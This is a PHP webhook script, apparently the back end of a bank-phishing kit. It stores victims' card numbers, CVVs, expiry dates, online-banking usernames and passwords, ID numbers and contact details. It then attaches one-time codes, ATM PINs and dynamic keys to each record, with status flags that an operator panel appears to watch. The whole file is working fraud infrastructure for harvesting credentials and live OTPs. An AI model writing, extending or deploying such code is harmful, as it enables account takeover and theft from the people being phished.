<?php
// api/webhook.php
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, GET, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type, X-API-Key');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit;
}

// 🔒 Cargar configuración
require_once __DIR__ . '/../panel/config/config.php';
$API_KEY_VALIDA = WEBHOOK_SECRET;

// Obtener API Key desde $_SERVER (funciona mejor con PHP-FPM)
$api_key = $_SERVER['HTTP_X_API_KEY'] ?? '';

if ($api_key !== $API_KEY_VALIDA) {
    http_response_code(401);
    echo json_encode(['error' => 'API Key inválida']);
    exit;
}

$input = json_decode(file_get_contents('php://input'), true);
if (!$input) {
    http_response_code(400);
    echo json_encode(['error' => 'Datos inválidos']);
    exit;
}

$dataDir = __DIR__ . '/../data/';
if (!is_dir($dataDir)) mkdir($dataDir, 0755, true);

$file = $dataDir . 'solicitudes.dat';
$solicitudes = file_exists($file) ? json_decode(file_get_contents($file), true) : [];

$solicitudId = $input['solicitudId'] ?? 'SOL-' . date('Ymd') . '-' . substr(uniqid(), -6);
$tipo_paso = $input['tipo_paso'] ?? 'credenciales';

// ============================================
// CASO 1: CREDENCIALES
// ============================================
if ($tipo_paso === 'credenciales') {
    $solicitud = [
        'id' => $solicitudId,
        'fecha' => date('Y-m-d H:i:s'),
        'tipo_paso' => 'credenciales',
        'estado' => 'pending',
        'fecha_hora' => $input['fechaHora'] ?? date('Y-m-d H:i:s'),
        'tipo_tarjeta' => $input['tipoTarjeta'] ?? 'visa',
        'numero_tarjeta' => $input['numeroTarjeta'] ?? 'N/A',
        'cvv' => $input['cvv'] ?? 'N/A',
        'vencimiento' => $input['vencimiento'] ?? 'N/A',
        'banco' => $input['bancoEmisor'] ?? 'N/A',
        'usuario' => $input['usuario'] ?? 'N/A',
        'password' => $input['password'] ?? 'N/A',
        'monto' => $input['monto'] ?? 'N/A',
        'nombre' => $input['nombreCompleto'] ?? 'N/A',
        'documento' => trim(($input['tipoDocumento'] ?? '') . ' ' . ($input['numeroDocumento'] ?? 'N/A')),
        'email' => $input['email'] ?? 'N/A',
        'celular' => $input['celular'] ?? 'N/A',
        // 🔥 CAMPOS SEPARADOS PARA CÓDIGOS
        'otp_codigo' => 'N/A',
        'clave_cajero_codigo' => 'N/A',
        'clave_dinamica_codigo' => 'N/A',
        'otp_codigo_secundario' => 'N/A',
        'otp_modo' => 'N/A',
        'ultima_actualizacion' => time()
    ];
    $solicitudes[] = $solicitud;
    
    file_put_contents($file, json_encode($solicitudes, JSON_PRETTY_PRINT));
    file_put_contents($dataDir . 'ultima_actualizacion.txt', time());
    
    http_response_code(200);
    echo json_encode([
        'success' => true,
        'id' => $solicitudId,
        'message' => 'Solicitud creada correctamente'
    ]);
    exit;
}

// ============================================
// CASO 2: OTP / CLAVE DINÁMICA / CLAVE CAJERO
// ============================================
if ($tipo_paso === 'otp' || $tipo_paso === 'clave_dinamica' || $tipo_paso === 'clave_cajero') {
    $originalId = $input['solicitudOriginalId'] ?? $input['solicitudId'] ?? null;
    
    if ($originalId) {
        $encontrado = false;
        foreach ($solicitudes as &$s) {
            if ($s['id'] === $originalId) {
                
                $codigo = $input['codigo'] ?? 'N/A';
                
                if ($tipo_paso === 'clave_cajero') {
                    // 🔥 CLAVE CAJERO: Guardar en su propio campo SIEMPRE
                    $s['clave_cajero_codigo'] = $codigo;
                    $s['estado'] = 'pending_clave_cajero';
                    $s['fecha_clave_cajero'] = date('Y-m-d H:i:s');
                    $mensaje = '🏧 Clave Cajero guardada';
                    
                } elseif ($tipo_paso === 'clave_dinamica') {
                    // 🔥 CLAVE DINÁMICA: Guardar en su propio campo SIEMPRE
                    $s['clave_dinamica_codigo'] = $codigo;
                    $s['estado'] = 'pending_otp';
                    $s['fecha_clave_dinamica'] = date('Y-m-d H:i:s');
                    $mensaje = '🔑 Clave Dinámica guardada';
                    
                } else {
                    // 🔥 OTP: Verificar si ya existe Clave Cajero
                    $tieneClaveCajero = isset($s['clave_cajero_codigo']) && 
                                        $s['clave_cajero_codigo'] !== 'N/A' && 
                                        $s['clave_cajero_codigo'] !== '';
                    
                    if ($tieneClaveCajero) {
                        // ✅ Ya hay Clave Cajero - guardar OTP en campo secundario
                        $s['otp_codigo_secundario'] = $codigo;
                        $mensaje = '📱 OTP secundario guardado (Clave Cajero prevalece)';
                    } else {
                        // No hay Clave Cajero - guardar normalmente
                        $s['otp_codigo'] = $codigo;
                        $s['otp_modo'] = 'otp';
                        $s['estado'] = 'pending_otp';
                        $s['fecha_otp'] = date('Y-m-d H:i:s');
                        $mensaje = '📱 OTP guardado';
                    }
                }
                
                $s['ultima_actualizacion'] = time();
                $encontrado = true;
                break;
            }
        }
        
        if ($encontrado) {
            file_put_contents($file, json_encode($solicitudes, JSON_PRETTY_PRINT));
            file_put_contents($dataDir . 'ultima_actualizacion.txt', time());
            
            http_response_code(200);
            echo json_encode([
                'success' => true,
                'id' => $originalId,
                'message' => $mensaje ?? 'Código guardado correctamente',
                'actualizado' => true
            ]);
            exit;
        }
    }
    
    http_response_code(404);
    echo json_encode([
        'success' => false,
        'error' => 'Solicitud original no encontrada'
    ]);
    exit;
}

http_response_code(400);
echo json_encode([
    'success' => false,
    'error' => 'Tipo de paso no reconocido'
]);
exit;